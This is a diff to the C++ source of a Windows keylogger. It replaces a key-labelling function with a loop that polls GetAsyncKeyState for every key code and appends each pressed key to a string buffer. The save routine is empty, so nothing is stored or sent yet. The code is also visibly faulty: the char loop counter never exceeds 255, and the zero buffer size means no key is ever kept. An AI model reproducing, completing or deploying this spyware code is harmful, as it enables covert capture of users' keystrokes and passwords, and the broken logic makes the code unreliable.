@@ -1,59 +1,39 @@
 #include "./keylogger.hpp"
 
-using namespace std;
-
-keylogger* g_keylogger;
-
 keylogger::keylogger()
 {
+	a_buffer = new string();
 
+	a_buffer_maximum_size = 0;
 }
 
 keylogger::~keylogger()
 {
-
+	delete a_buffer;
 }
 
-void keylogger::save(int p_key)
+void keylogger::save()
 {
 
 }
 
-void keylogger::save(LPCSTR p_key)
+void keylogger::start()
 {
-}
+	int t_count = 0;
 
-void keylogger::treat(int p_key)
-{
-	switch (p_key)
-	{
-		case 1:
-			save("[LEFT_CLICK]");
-			break;
-		case 2:
-			save("[RIGHT_CLICK]");
-			break;
-		case 8:
-			save("[BACKSPACE]");
-			break;
-		case 13:
-			save("[ENTER]\r\n");
-			break;
-		case 37:
-			save("[LEFT]");
-			break;
-		case 38:
-			save("[UP]");
-			break;
-		case 39:
-			save("[RIGHT]");
-			break;
-		case 40:
-			save("[DOWN]");
-			break;
-
-		default:
-			save(p_key);
-		break;
-	}
+	while(TRUE)
+		for(char t_key = 1; t_key <= 255; t_key++)
+			if(GetAsyncKeyState(t_key) == -32767)
+			{
+				if(t_count == a_buffer_maximum_size)
+				{
+					save();
+					t_count = 0;
+				}
+				else
+				{
+					*a_buffer += to_string(t_key) + ",";
+					t_count++;
+				}
+			}
 }
